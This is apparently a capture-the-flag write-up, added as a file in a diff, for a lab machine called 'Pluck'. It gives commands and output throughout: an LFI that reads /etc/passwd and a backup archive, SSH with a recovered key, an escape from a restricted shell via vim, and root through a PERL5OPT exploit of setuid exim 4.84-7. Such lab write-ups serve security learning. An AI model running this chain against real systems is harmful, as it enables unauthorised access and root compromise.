@@ -1,0 +1,176 @@
+$sudo netdiscover -i wlp2s0
+192.168.1.115
+
+$nmap -A 192.168.1.115 -Pn -T5
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
+|   256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
+|_  256 18:98:5a:5a:5c:59:e1:25:70:1c:37:1a:f2:c7:26:fe (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Pluck
+3306/tcp open  mysql   MySQL (unauthorized)
+5355/tcp open  llmnr?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+$ dirb http://192.168.1.115
+
+---- Scanning URL: http://192.168.1.115/ ----
++ http://192.168.1.115/admin.php (CODE:200|SIZE:2721)                          
+==> DIRECTORY: http://192.168.1.115/css/                                       
+==> DIRECTORY: http://192.168.1.115/fonts/                                     
+==> DIRECTORY: http://192.168.1.115/images/                                    
++ http://192.168.1.115/index.php (CODE:200|SIZE:2309)                          
+==> DIRECTORY: http://192.168.1.115/js/                                        
++ http://192.168.1.115/server-status (CODE:403|SIZE:301)     
+
+# dirb gave me nothing then I decided to check the webpage
+
+http://192.168.1.115/
+
+I came across wiht an url like this
+http://192.168.1.115/index.php?page=about.php
+
+I wondered if I could do an LFI
+http://192.168.1.115/index.php?page=/etc/passwd
+
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin 
+sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin 
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd
+Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:109::/var/run/dbus:/bin/false mysql:x:107:111:MySQL Server,,,
+:/nonexistent:/bin/false lxd:x:108:65534::/var/lib/lxd/:/bin/false uuidd:x:109:114::/run/uuidd:/bin/false dnsmasq:x:110:65534:dnsmasq
+,,,:/var/lib/misc:/bin/false sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:112:1::/var/cache/pollinate:/bin/false
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash Debian-exim:x:113:119::/var/spool/exim4:/bin/false peter:x:1001:1001
+:,,,:/home/peter:/bin/bash paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu backup-user:x:1003:1003:
+Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
+
+
+yes it is vulnerable to LFI, I tried really hard to turn LFI into RCE but I failed. Later when 
+I was checking my findings I noticed that there is a backup user and a bakup
+script that it uses
+
+Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
+
+lets try to include this file
+
+http://192.168.1.115/index.php?page=/usr/local/scripts/backup.sh
+
+#!/bin/bash ######################## # Server Backup script # ######################## #
+Backup directories in /backups so we can get it via tftp echo "Backing up data"
+tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null
+echo "Backup complete"
+
+it stores the results of the script in the /backups/backup.tar
+
+I decided to download the file with wget
+
+$ wget http://192.168.1.115/index.php?page=/backups/backup.tar
+
+I extracted the file and read the content
+
+there is a home directory in this file , and there 3 user directories
+in user paul's directory there is a keys file which contains some cryptograğhic
+keys
+
+I found that id_key4 is an RSA key that I can use to connect ssh
+
+$ ssh -l paul 192.168.1.115 -i id_key4
+
+We are in but the shell that waits for us is not so good
+
+  							 ┌─────Main Menu─────┐
+                             │ Directory listing │
+                             │ Change directory  │
+                             │ Edit file         │
+                             │ Who's online?     │
+                             │ WWW               │
+                             │ Telnet            │
+                             │ Ping              │
+                             │                   │
+                             │ Exit              │
+                             └───────────────────┘
+
+
+lets escape out of this shell.
+
+When escaping out of shell is a matter, I always try to do it via vim or vi
+
+lets Edit file in /var/www/html/about.php
+
+and type
+
+:set shell=/bin/sh
+:shell
+
+now we escaped out of that shell
+
+I first tried to own a user with password but I failed that I decided
+check cron jobs found nothing again , finally when I was checking some 
+uid bits 
+
+$ find / -perm 4000 2>/dev/null
+
+/usr/exim/bin/exim-4.84-7
+
+and there is a public exploit for this
+
+https://www.exploit-db.com/exploits/39549  on this url
+
+steps to own root user
+
+$ /usr/exim/bin/exim-4.84-7 -bV -v | grep -i Perl
+Support for: iconv() Perl DKIM PRDR OCSP
+
+
+$ PERL5OPT="-d/dev/null" /usr/exim/bin/exim-4.84-7 -ps victim@localhost
+
+DB<1> p system("id");
+
+uid=0(root) gid=1002(paul) groups=1002(paul)
+
+  DB<2> p system("ls /root");
+  flag.txt
+  
+ DB<3> p system("cat /root/flag.txt");
+ 
+ Congratulations you found the flag
+
+---------------------------------------
+
+######   ((((((((((((((((((((((((((((((
+#########   (((((((((((((((((((((((((((
+,,##########   ((((((((((((((((((((((((
+@@,,,##########   (((((((((((((((((((((
+@@@@@,,,##########                     
+@@@@@@@@,,,############################
+@@@@@@@@@@@,,,#########################
+@@@@@@@@@,,,###########################
+@@@@@@,,,##########                    
+@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
+,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
+##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
+#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+
+
+
+
+
+
